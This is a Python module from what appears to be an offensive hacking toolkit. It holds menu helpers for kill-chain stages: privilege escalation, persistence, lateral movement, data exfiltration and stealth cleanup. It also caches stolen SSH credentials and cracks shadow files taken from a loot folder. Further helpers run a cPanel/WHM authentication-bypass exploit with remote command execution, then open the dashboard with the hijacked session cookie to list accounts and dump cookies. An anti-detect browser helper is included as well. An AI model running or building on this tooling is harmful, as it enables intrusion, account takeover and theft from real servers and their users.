#!/usr/bin/env python3
"""
Post-exploitation tools: SSH sessions, kill chain stages, WAF detect, Shodan, hash cracking.
Extracted from tools.py.
"""

import os
import re
import concurrent.futures

from core.tools.base import (
    run_tool, is_tool_available, get_tool_config,
    C_GREY, C_RESET, C_CYAN, C_GREEN, C_YELLOW, C_RED,
)
from core.tools.exploit_tools import (
    register_credential, get_best_creds_for_target,
)
from core.tools.recon_tools import (
    run_nmap, run_whois, run_whatweb, run_curl_headers,
    run_dig, run_sslscan, run_ffuf, run_enum4linux,
    run_smbclient, run_wpscan, run_sqlmap, run_nikto,
    run_scrapling_fetch, run_ssh_user_enum,
)



def _run_ssh_session_interactive(target: str) -> str:
    """Interactive SSH session — prompts for creds if not already known."""
    try:
        from ssh_session import ssh_analyze
    except ImportError:
        return "[!] ssh_session.py not found."
    # Check if we already have creds for this target
    known = get_best_creds_for_target(target)
    if known[0] and known[1]:
        print(f"  \033[92m[+] Using cached credentials: {known[0]}@{target}\033[0m")
        use_cached = input(f"  Use cached creds {known[0]}:****? [Y/n]: ").strip().lower()
        if use_cached != 'n':
            return ssh_analyze(target, known[0], known[1])
    user = input(f"  SSH Username for {target}: ").strip() or "root"
    pwd  = input(f"  SSH Password for {target}: ").strip()
    if not pwd:
        return "[!] No password provided."
    # Register creds for reuse
    register_credential("ssh", target, user, pwd)
    return ssh_analyze(target, user, pwd)


def _run_killchain_stage(stage: str, target: str) -> str:
    """Run a kill chain stage that doesn't need credentials."""
    try:
        from killchain import vuln_assess, auto_exploit
        if stage == "vuln_assess":
            return vuln_assess(target)
        elif stage == "auto_exploit":
            return auto_exploit(target)
    except ImportError:
        return "[!] killchain.py not found."
    return "[!] Unknown stage."


def _run_killchain_interactive(stage: str, target: str) -> str:
    """Run a kill chain stage that needs SSH credentials."""
    try:
        from killchain import run_privesc, plant_persistence, lateral_move, data_exfil, run_full_killchain
    except ImportError:
        return "[!] killchain.py not found."

    # Check if we already have creds for this target
    known = get_best_creds_for_target(target)
    if known[0] and known[1]:
        print(f"  \033[92m[+] Using cached credentials: {known[0]}@{target}\033[0m")
        use_cached = input(f"  Use cached creds {known[0]}:****? [Y/n]: ").strip().lower()
        if use_cached != 'n':
            user, pwd = known
        else:
            user = input(f"  SSH Username for {target}: ").strip() or "root"
            pwd  = input(f"  SSH Password for {target}: ").strip()
            if not pwd:
                return "[!] No password provided."
            register_credential("ssh", target, user, pwd)
    else:
        user = input(f"  SSH Username for {target}: ").strip() or "root"
        pwd  = input(f"  SSH Password for {target}: ").strip()
        if not pwd:
            return "[!] No password provided."
        # Register creds for reuse by AI and other stages
        register_credential("ssh", target, user, pwd)

    if stage == "privesc":
        return run_privesc(target, user, pwd)
    elif stage == "persist":
        return plant_persistence(target, user, pwd)
    elif stage == "lateral":
        return lateral_move(target, user, pwd)
    elif stage == "exfil":
        return data_exfil(target, user, pwd)
    elif stage == "full":
        return run_full_killchain(target, user, pwd)
    elif stage == "cleanup":
        try:
            from killchain import stealth_cleanup
            return stealth_cleanup(target, user, pwd)
        except ImportError:
            return "[!] killchain.py stealth_cleanup not found."
    return "[!] Unknown kill chain stage."


def _run_waf_detect(target: str) -> str:
    """Detect WAF/firewall on target."""
    try:
        from evasion import WebEvasionSession
        ws = WebEvasionSession()
        result = ws.detect_waf(f"http://{target}")
        out = f"[WAF DETECTION — {target}]\n"
        out += f"WAF Detected: {result['waf_detected']}\n"
        out += f"WAF Type: {result['waf_type']}\n"
        for d in result.get('details', []):
            out += f"  → {d}\n"
        return out
    except ImportError:
        return "[!] evasion.py not found."


# ── v8.0: SHODAN MENU HELPERS ──────────────────────────

def _run_shodan_interactive(target: str) -> str:
    """Interactive Shodan search from menu."""
    try:
        from shodan_module import run_shodan_interactive
        return run_shodan_interactive(target)
    except ImportError:
        return "[!] shodan_module.py not found. pip install shodan"

def _run_shodan_host(target: str) -> str:
    """Shodan host lookup from menu."""
    try:
        from shodan_module import run_shodan_host
        return run_shodan_host(target)
    except ImportError:
        return "[!] shodan_module.py not found."

def _run_shodan_vulns(target: str) -> str:
    """Shodan CVE lookup from menu."""
    try:
        from shodan_module import run_shodan_vulns
        return run_shodan_vulns(target)
    except ImportError:
        return "[!] shodan_module.py not found."

def _run_shodan_range(target: str) -> str:
    """Shodan range/subnet scan from menu."""
    try:
        from shodan_module import run_shodan_range
        # Auto-generate CIDR from target IP if single IP
        import re as _re
        if _re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target.strip()):
            # Single IP — suggest /24
            subnet = '.'.join(target.split('.')[:3]) + '.0/24'
            cidr = input(f"  CIDR range [{subnet}]: ").strip() or subnet
        else:
            cidr = input(f"  CIDR range (e.g. 83.166.241.0/24): ").strip()
        if cidr:
            return run_shodan_range(cidr)
        return "[!] No CIDR provided."
    except ImportError:
        return "[!] shodan_module.py not found."

def _run_crack_hashes(target: str) -> str:
    """Hash cracking from menu — auto-detects shadow files from loot."""
    try:
        from hash_cracker import run_crack_hashes
        if os.path.isfile(target):
            return run_crack_hashes(target)
        # v8.1: Auto-detect shadow files from loot
        loot_dir = os.path.expanduser(f"~/OCTOPUS/loot/{target.replace('.', '_')}")
        auto_files = []
        for search_dir in [loot_dir, "/tmp"]:
            if os.path.isdir(search_dir):
                for f in os.listdir(search_dir):
                    if "shadow" in f.lower() or f.endswith(".hash"):
                        auto_files.append(os.path.join(search_dir, f))
        if auto_files:
            print(f"  Found shadow/hash files:")
            for i, f in enumerate(auto_files, 1):
                print(f"    [{i}] {f}")
            choice = input(f"  Select file # or paste path: ").strip()
            if choice.isdigit() and 1 <= int(choice) <= len(auto_files):
                return run_crack_hashes(auto_files[int(choice) - 1])
            elif os.path.isfile(choice):
                return run_crack_hashes(choice)
        # Fallback: prompt
        path = input(f"  Shadow file path (or paste hashes): ").strip()
        if path:
            return run_crack_hashes(path)
        return "[!] No input provided."
    except ImportError:
        return "[!] hash_cracker.py not found."


# ─────────────────────────────────────────────
# MAIN RECON PIPELINE
# ─────────────────────────────────────────────

def run_default_recon(target: str) -> dict:
    """
    Run the standard recon pipeline CONCURRENTLY.
    Returns a dict of {tool_name: output_string}.
    Now includes scrapling for web targets.
    v8.0: Adds optional Shodan enrichment.
    """
    print(f"\n[*] Starting concurrent recon on: {target}")
    print("\u2500" * 50)

    # We select the fast/standard tools for the default run
    default_tools = {
        "nmap":         run_nmap,
        "whois":        run_whois,
        "whatweb":      run_whatweb,
        "curl_headers": run_curl_headers,
        "dig":          run_dig,
        "sslscan":      run_sslscan,
        "ffuf":         run_ffuf,
        "enum4linux":   run_enum4linux,
        "smbclient":    run_smbclient,
    }

    results = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(default_tools)) as executor:
        future_to_name = {executor.submit(func, target): key for key, func in default_tools.items()}
        for future in concurrent.futures.as_completed(future_to_name):
            tool_name = future_to_name[future]
            try:
                data = future.result()
            except Exception as exc:
                data = f"[!] {tool_name} generated an exception: {exc}"
            results[tool_name] = data

    # v8.0: Shodan enrichment (non-blocking — skips if no API key)
    try:
        from shodan_module import run_shodan_host
        import re as _re
        if _re.match(r'^\d+\.\d+\.\d+\.\d+$', target.strip()):
            shodan_data = run_shodan_host(target)
            if shodan_data and "[!]" not in shodan_data[:10]:
                results["shodan"] = shodan_data
    except Exception:
        pass  # Shodan not available — that's fine

    print("─" * 50)
    print("[+] Recon complete.\n")
    return results


def _verify_cpanel_in_browser(target: str, port: int, token: str, session: str) -> str:
    """Open cPanel dashboard in ShardBrowser with stolen session cookie."""
    try:
        from core.osint.shardbrowser import ShardBrowser
    except ImportError:
        return "  [!] ShardBrowser not available — cannot verify in browser."

    sb = ShardBrowser()
    status = sb.get_status()
    if not status.get("installed"):
        return f"  [!] ShardBrowser not ready: {status.get('error', '')}"

    # Build authenticated URL (WHM dashboard)
    base_url = f"https://{target}:{port}"
    dashboard_url = f"{base_url}{token}/scripts2/listaccts"
    api_url = f"{base_url}{token}/json-api/version"

    # Cookie for cPanel/WHM
    domain = target.strip()
    cookies = [
        {
            "name": "whostmgrsession",
            "value": session,
            "domain": domain,
            "path": "/",
            "httpOnly": True,
            "secure": True,
            "sameSite": "Lax",
        },
        {
            "name": "whostmgrrelogin",
            "value": "no",
            "domain": domain,
            "path": "/",
            "secure": True,
            "sameSite": "Lax",
        },
    ]

    import os, re, time

    screenshot_dir = os.path.join(
        os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
        "data", "screenshots"
    )
    os.makedirs(screenshot_dir, exist_ok=True)
    ts = int(time.time())
    screenshot_path = os.path.join(screenshot_dir, f"cpanel_{target}_{ts}.png")

    lines = []
    lines.append(f"")
    lines.append(f"  ╔══════════════════════════════════════════════════╗")
    lines.append(f"  ║  ShardX — cPanel Session Verification            ║")
    lines.append(f"  ╚══════════════════════════════════════════════════╝")
    lines.append(f"")

    # Step 1: Verify API access
    print(f"  [*] Step 1: Verifying API access via {api_url[:60]}...")
    try:
        api_result = sb.browse_with_cookies(
            api_url, cookies, headless=True, wait=3,
        )
        api_content = api_result.get("content", "")
        api_title = api_result.get("title", "")

        # Parse version from JSON API response
        import json as _json
        version_match = re.search(r'"version"\s*:\s*"([^"]+)"', api_content)
        if version_match:
            lines.append(f"  ✅ API verified — cPanel version: {version_match.group(1)}")
        elif api_result.get("status_code") == 200:
            lines.append(f"  ✅ API responded (HTTP {api_result.get('status_code')})")
        else:
            lines.append(f"  ⚠️  API status: HTTP {api_result.get('status_code', '?')}")

    except Exception as e:
        lines.append(f"  ⚠️  API check failed: {e}")
        api_content = ""

    # Step 2: Browse WHM dashboard
    print(f"  [*] Step 2: Opening WHM dashboard...")
    try:
        dash_result = sb.browse_with_cookies(
            dashboard_url, cookies, headless=True,
            screenshot_path=screenshot_path, wait=5,
        )
        content = dash_result.get("content", "")
        title = dash_result.get("title", "")

        lines.append(f"  Dashboard: {dash_result.get('url_final', dashboard_url)}")
        lines.append(f"  Title:     {title[:80] if title else '(empty)'}")
        lines.append(f"  Size:      {len(content)} bytes")
        lines.append(f"  HTTP:      {dash_result.get('status_code', '?')}")

        if os.path.isfile(screenshot_path):
            lines.append(f"  Screenshot: {screenshot_path}")

        # Extract account list from WHM listaccts page
        accounts = re.findall(r'<td[^>]*class="[^"]*cell[^"]*"[^>]*>\s*(\S+@\S+|\w+)\s*</td>', content)
        if not accounts:
            accounts = re.findall(r'acct\[\d+\]\s*=\s*\{[^}]*"user"\s*:\s*"([^"]+)"', content)
        if not accounts:
            accounts = re.findall(r'"user"\s*:\s*"([^"]+)"', content)

        unique_accounts = list(dict.fromkeys(accounts))[:30]
        if unique_accounts:
            lines.append(f"")
            lines.append(f"  ─── ACCOUNTS FOUND ({len(unique_accounts)}) ───")
            for acc in unique_accounts:
                lines.append(f"    • {acc}")

        # Extract hostname
        hostname_m = re.search(r'hostname["\s:]+([a-zA-Z0-9._-]+)', content, re.IGNORECASE)
        if hostname_m:
            lines.append(f"  Hostname: {hostname_m.group(1)}")

        # Extract navigation links (WHM panel sections)
        nav_links = re.findall(r'href="(/cpsess\d+/[^"]+)"[^>]*>\s*([^<]+)', content)
        if nav_links:
            lines.append(f"")
            lines.append(f"  ─── WHM PANEL SECTIONS ───")
            seen = set()
            for href, text in nav_links[:25]:
                text = text.strip()
                if text and text not in seen and len(text) > 2:
                    seen.add(text)
                    lines.append(f"    → {text[:40]:40s}  {base_url}{href[:60]}")

        # Extract cookies for persistence
        if dash_result.get("cookies_after"):
            lines.append(f"")
            lines.append(f"  ─── SESSION COOKIES ───")
            for c in dash_result["cookies_after"][:10]:
                lines.append(f"    {c['name']:25s} = {c['value']}")

        lines.append(f"")
        lines.append(f"  ✅ BROWSER VERIFICATION COMPLETE")

        # Extract text summary for AI
        text = re.sub(r'<script[^>]*>.*?</script>', '', content, flags=re.DOTALL)
        text = re.sub(r'<style[^>]*>.*?</style>', '', text, flags=re.DOTALL)
        text = re.sub(r'<[^>]+>', ' ', text)
        text = re.sub(r'\s+', ' ', text).strip()
        if len(text) > 200:
            lines.append(f"")
            lines.append(f"  ─── PAGE TEXT (first 2000 chars) ───")
            for i in range(0, min(len(text), 2000), 120):
                lines.append(f"  {text[i:i+120]}")

    except Exception as e:
        lines.append(f"  [!] Dashboard browse failed: {e}")

    return "\n".join(lines)


def _run_cpanel_exploit(target: str) -> str:
    """Interactive cPanel CVE-2026-41940 exploit from menu."""
    try:
        from modules.exploits.cpanel_auth_bypass import CpanelSniper
    except ImportError:
        return "[!] cpanel_auth_bypass module not found."

    port_str = input(f"  Port [2087]: ").strip() or "2087"
    port = int(port_str)
    mode = input("  Mode — [1] Check only  [2] Full exploit (default): ").strip() or "2"

    sniper = CpanelSniper()

    if mode == "1":
        result = sniper.scan(f"{target}:{port}")
    else:
        rce_cmd = input("  RCE command [id]: ").strip() or "id"
        result = sniper.exec_cmd(f"{target}:{port}", cmd=rce_cmd)

    # ── Build structured output ──
    lines = []
    lines.append(f"╔══════════════════════════════════════════════════╗")
    lines.append(f"║  CVE-2026-41940 — cPanel/WHM Auth Bypass         ║")
    lines.append(f"╚══════════════════════════════════════════════════╝")
    lines.append(f"")
    lines.append(f"  Target:   https://{target}:{port}")
    lines.append(f"  Status:   {result.get('status', 'unknown').upper()}")

    if result.get("token"):
        lines.append(f"  Token:    {result['token']}")
    if result.get("session"):
        lines.append(f"  Session:  {result['session']}")
    if result.get("version"):
        lines.append(f"  Version:  {result['version']}")
    if result.get("api_url"):
        lines.append(f"  API URL:  {result['api_url']}")
    if result.get("hostname"):
        lines.append(f"  Hostname: {result['hostname']}")

    lines.append(f"  Elapsed:  {result.get('elapsed_s', '?')}s")
    lines.append(f"  Exit:     {result.get('exit_code', '?')}")

    if result.get("cmd_output"):
        lines.append(f"")
        lines.append(f"  ─── COMMAND OUTPUT ───")
        for ln in result["cmd_output"].splitlines():
            lines.append(f"  {ln}")

    if result.get("accounts"):
        lines.append(f"")
        lines.append(f"  ─── ACCOUNTS ({len(result['accounts'])}) ───")
        for acc in result["accounts"][:20]:
            lines.append(f"  {acc['user']:20s} {acc['domain']}")

    if result.get("status") == "vulnerable":
        lines.append(f"")
        lines.append(f"  ✅ TARGET IS VULNERABLE — authenticated session obtained")
        if result.get("token") and result.get("session"):
            api = f"https://{target}:{port}{result['token']}/json-api/version"
            lines.append(f"  cPanel API:  {api}")
            lines.append(f"  Cookie:      whostmgrsession={result['session']}")

        # ── Offer browser verification ──
        if result.get("token") and result.get("session"):
            lines.append(f"")
            # Print what we have so far
            print("\n".join(lines))
            lines.clear()

            verify = input("\n  [?] Open cPanel dashboard in ShardBrowser to verify? [Y/n]: ").strip().lower()
            if verify != "n":
                browser_result = _verify_cpanel_in_browser(
                    target, port, result["token"], result["session"]
                )
                lines.append(browser_result)
            else:
                lines.append("")

    raw = result.get("raw_output", "")
    if raw:
        lines.append(f"")
        lines.append(f"  ─── RAW BINARY OUTPUT ───")
        for ln in raw.splitlines()[:50]:
            lines.append(f"  {ln}")

    return "\n".join(lines)


def _run_shardbrowser_osint(target: str) -> str:
    """Interactive ShardBrowser — direct navigation or OSINT search."""
    try:
        from core.osint.shardbrowser import ShardBrowser
    except ImportError:
        return "[!] ShardBrowser module not found."

    sb = ShardBrowser()
    status = sb.get_status()
    if not status.get("installed"):
        return (f"[!] ShardBrowser not ready: {status.get('error', 'unknown')}\n"
                "Install deps: pip install httpx[socks] patchright")

    import re as _re

    # Detect if target is IP/URL (navigate directly) vs search query (OSINT search)
    is_ip_or_url = bool(_re.match(
        r'^(\d{1,3}\.){3}\d{1,3}(:\d+)?$|^https?://|^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(:\d+)?(/.*)?$',
        target.strip()
    ))

    if is_ip_or_url:
        # Default: direct navigation mode
        print(f"  [*] Target is IP/URL — using direct navigation (not search)")
        mode = input(f"  Mode — [1] Direct browse (default)  [2] OSINT search: ").strip() or "1"
    else:
        mode = "2"

    if mode == "1":
        # ── Direct navigation: open target in anti-detect browser ──
        proto = input(f"  Protocol [https]: ").strip() or "https"
        port_in = input(f"  Port [auto]: ").strip()

        # Build URL
        t = target.strip()
        if not t.startswith("http"):
            if port_in:
                url = f"{proto}://{t}:{port_in}"
            else:
                url = f"{proto}://{t}"
        else:
            url = t

        print(f"  [*] Navigating to: {url}")

        session = None
        try:
            session = sb.launch_profile(
                platform="Windows", headless=True, randomize=True,
            )

            import asyncio
            try:
                loop = asyncio.get_running_loop()
            except RuntimeError:
                loop = None

            if loop and loop.is_running():
                # Already in async context — use new loop in thread
                import concurrent.futures
                with concurrent.futures.ThreadPoolExecutor() as pool:
                    content = pool.submit(
                        asyncio.run,
                        sb._browse_async(session.cdp_url, url, wait=5)
                    ).result(timeout=30)
            else:
                content = asyncio.run(
                    sb._browse_async(session.cdp_url, url, wait=5)
                )

            # Extract useful info from page
            lines = []
            lines.append(f"╔══════════════════════════════════════════════════╗")
            lines.append(f"║  ShardX Direct Browse — {url[:40]:<40s} ║")
            lines.append(f"╚══════════════════════════════════════════════════╝")
            lines.append(f"")
            lines.append(f"  URL:            {url}")
            lines.append(f"  Content size:   {len(content)} bytes")

            # Extract title
            import re
            title_m = re.search(r'<title[^>]*>(.*?)</title>', content, re.DOTALL | re.IGNORECASE)
            if title_m:
                lines.append(f"  Page title:     {title_m.group(1).strip()[:100]}")

            # Extract headers from meta tags
            metas = re.findall(r'<meta\s+[^>]*name=["\']([^"\']+)["\'][^>]*content=["\']([^"\']+)["\']',
                               content, re.IGNORECASE)
            if metas:
                lines.append(f"  Meta tags:")
                for name, val in metas[:10]:
                    lines.append(f"    {name}: {val[:80]}")

            # Extract links
            hrefs = re.findall(r'href=["\']([^"\']+)["\']', content)
            unique_hrefs = list(dict.fromkeys(hrefs))[:20]
            if unique_hrefs:
                lines.append(f"  Links ({len(hrefs)} total, showing {len(unique_hrefs)}):")
                for h in unique_hrefs:
                    lines.append(f"    → {h[:120]}")

            # Extract forms (login forms, etc.)
            forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', content, re.IGNORECASE)
            if forms:
                lines.append(f"  Forms:")
                for f in forms[:5]:
                    lines.append(f"    POST → {f}")

            # Extract input fields (credential fields)
            inputs = re.findall(r'<input[^>]*type=["\']?(password|text|email)["\']?[^>]*name=["\']([^"\']+)["\']',
                                content, re.IGNORECASE)
            if inputs:
                lines.append(f"  Input fields:")
                for itype, iname in inputs[:10]:
                    lines.append(f"    [{itype}] {iname}")

            # Server headers from content clues
            server_m = re.search(r'[Ss]erver:\s*([^\r\n]+)', content)
            poweredby = re.search(r'[Xx]-[Pp]owered-[Bb]y:\s*([^\r\n]+)', content)
            if server_m:
                lines.append(f"  Server:         {server_m.group(1)}")
            if poweredby:
                lines.append(f"  X-Powered-By:   {poweredby.group(1)}")

            lines.append(f"")
            lines.append(f"  ─── PAGE CONTENT (first 3000 chars) ───")
            # Strip HTML tags for readable text
            text = re.sub(r'<script[^>]*>.*?</script>', '', content, flags=re.DOTALL)
            text = re.sub(r'<style[^>]*>.*?</style>', '', text, flags=re.DOTALL)
            text = re.sub(r'<[^>]+>', ' ', text)
            text = re.sub(r'\s+', ' ', text).strip()
            for i in range(0, min(len(text), 3000), 120):
                lines.append(f"  {text[i:i+120]}")

            return "\n".join(lines)

        except Exception as e:
            return f"[!] ShardX browse failed: {e}"
        finally:
            if session:
                try:
                    session.stop()
                except Exception:
                    pass
    else:
        # ── OSINT search mode ──
        query = input(f"  Search query [{target}]: ").strip() or target
        engines_str = input("  Engines [google,bing,duckduckgo]: ").strip()
        engines = [e.strip() for e in engines_str.split(",")] if engines_str else None
        results = sb.osint_target(query, engines=engines)
        import json as _json
        return f"[ShardX OSINT Search — {query}]\n" + _json.dumps(results, indent=2, default=str)


